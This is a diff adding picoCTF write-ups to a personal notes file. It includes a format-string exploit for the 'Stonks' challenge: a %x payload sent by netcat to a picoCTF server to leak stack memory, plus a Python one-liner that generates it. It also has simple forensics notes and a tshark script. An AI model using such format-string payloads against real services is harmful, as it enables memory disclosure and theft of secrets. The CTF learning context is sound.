@@ -465,9 +465,155 @@ If you want to waste your time trying to solve it, go ahead. Otherwise, consider
 
 Here you are given a file `vuln.c` and told that there is a bot to trade "stonks" using AI and ML. It looks to be  service listening on `mercury.picoctf.net 16439` that you can interact with via netcat (`nc`). Probably need to spend some time looking at `vuln.c` to see what is going on...
 
+Well, I somewhat quickly assertained what was going on (format string vulnerability), but I then proved to myself that __I had abosolutely no idea how to actually exploit__ or take advantage of it. I spent *way* too much time trying to figure things out. 
+
+What I ended up doing was creating a file called `inputs` that looks like the following:
+
+```text
+1
+%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x
+```
+
+This represents the two inputs I wanted to provide to the program. I then called the program as you would normally expect:
+
+```bash
+$ nc mercury.picoctf.net 16439 < inputs
+Welcome back to the trading app!
+
+What would you like to do?
+1) Buy some stonks!
+2) View my portfolio
+Using patented AI algorithms to buy stonks
+Stonks chosen
+What is your API token?
+Buying stonks with token:
+9aa0390804b00080489c3f7eecd80ffffffff19a9e160f7efa110f7eecdc709a9f18029aa03709aa03906f6369707b465443306c5f49345f74356d5f6c6c306d5f795f79336e6263376365616336ff8a007d
+Portfolio as of Thu Oct 28 20:20:27 UTC 2021
+
+
+2 shares of I
+6 shares of WJ
+22 shares of W
+55 shares of ZCVR
+1903 shares of Z
+Goodbye!
+```
+
+I assumed that the flag would start with `picoCTF{` as most of them had, so I confirmed that I knew that the little-endian hex version of the start of that string was `6f636970`. I identified that portion in the byte string above, took from there to the end and dumped it into cyberchef. I then used a `swap endianness` tool complete with `from hex` and I had the flag.
+
+I made that *__way__* too difficult.
+
+One helpful line of code that I don't want to loose:
+
+```bash
+$ python3 -c "print('%x'*30)"
+```
 
 
 
 ## Uncategorized
 
 
+## picoMini by redpwn
+
+## picoCTF 2021
+
+## picoCTF 2020 Mini-Competition
+
+## picoCTF 2019
+
+### Glory of the Garden
+
+Given an image (`garden.jpg`), can you find the flag.
+
+Looking at the image didn't show much, and there was nothing immediately obvious in the metadata. Knowing that it is a 50 pt problem, it has to be pretty easy, so I ran strings against it and the last line includes: `Here is a flag "picoCTF{redacted_value}"`
+
+### So Meta
+
+Asked to find the flag in the provided picture: `pico_img.png`.
+
+Probably could have used some image-processing tool to inspect the metadata, but I ran it through strings and immediately found what I was looking for (e.e. `$ strings pico_img.png | grep pico`)
+
+### shark on wire 1
+
+Given a capture file (`capture.pcap`), you are asked to recover the flag.
+
+After noodling around a bit, I found the flag, but I wish I had a better way.
+
+I searched for `pico` and found nothing.
+
+I then went to `Statistics --> Conversations`. From there, I started looking around at ones that looked interesting, and started clicking on UDP converstions where there was data being sent back (e.g. `B --> A`). After clicking a few and pressing `Follow Stream...` I found the flag.
+
+While this works for the problem, there *must* be a better way. I read a handful of write-ups, and many people "just searched" like I had and seemed to have stumbled upon it. I still don't like that as a sustainable approach, because it feels too much like luck.
+
+I then found [this writeup](https://github.com/Dvd848/CTFs/blob/master/2019_picoCTF/shark_on_wire_1.md) which used a bash script with `tshark` (command-line version of wireshark) to find it. This is a much better approach in my mind.
+
+Therefore, in order to ensure I learned from this, I pulled apart the script so I could understand what is going on.  I include it below with my comments for clarity, but credit for the script goes to [dvd848](https://github.com/Dvd848)
+
+```bash
+#!/bin/bash
+
+# this is the file we are interrogating
+PCAP=shark_on_wire.pcap; 
+
+# determine how many UDP streams exist in the file
+# this number increments so we just grab the last one.
+END=$(tshark -r $PCAP -T fields -e udp.stream | sort -n | tail -1); 
+
+# loop through the UDP streams...
+for ((i=0;i<=END;i++));
+do
+    # for the given stream:
+    #   show the data as text, ignoring any errors
+    #   remove any line returns via the translate (`tr`) tool
+    #   grep/search for "picoCTF"
+    tshark -r $PCAP -Y "udp.stream eq $i" -T fields -e data.text -o data.show_as_text:TRUE 2>/dev/null | tr -d '\n' | grep "picoCTF"; 
+
+    # if the result of the prior command was "0" (successful), indicate which stream it was in.
+    if [ $? -eq 0 ]; then
+        echo "(Stream #$i)";
+    fi; 
+done
+```
+
+### extensions
+
+By the name, you can guess that the file extension is wrong. If you run `file` against it, you see that it believes it to be a `png`.
+
+Running `strings` shows you nothing, but if you open it in an image viewer you see the flag to submit
+
+### What Lies Within
+
+File is definitely an image. Neither `identify` or `exiftool` showed anything interesting. Running `strings` didn't make anything immediately obvious either.
+
+### m00nwalk
+
+### WhitePages
+
+### c0rrupt
+
+### like1000
+
+### m00nwalk2
+
+### Investigative Reversing 0
+
+### shark on wire 2
+
+### Investigative Reversing 1
+
+### Investigative Reversing 2
+
+### WebNet0
+
+### Investigative Reversing 3
+
+### Investigative Reversing 4
+
+### WebNet1
+
+### investigation_encoded_1
+
+### investigation_encoded_2
+
+### B1g_Mac
